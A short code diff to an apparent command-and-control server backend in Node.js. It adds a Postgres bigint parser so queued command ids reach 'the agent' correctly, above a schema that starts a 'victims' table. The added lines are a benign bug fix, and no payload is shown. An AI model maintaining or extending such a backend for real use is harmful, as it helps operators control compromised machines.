@@ -29,6 +29,12 @@ const pool = new Pool({
   max: 5
 });
 
+// node-postgres hands bigint back as a string, so a queued command id reached
+// the agent as "5" instead of 5 and the agent replied with id 0 - a result that
+// updated no row and still returned 200. Ids are well inside the safe integer
+// range, so parse them once, here, rather than at every call site.
+require("pg").types.setTypeParser(20, (v) => parseInt(v, 10));
+
 const SCHEMA = `
 create table if not exists victims (
   id            text primary key,
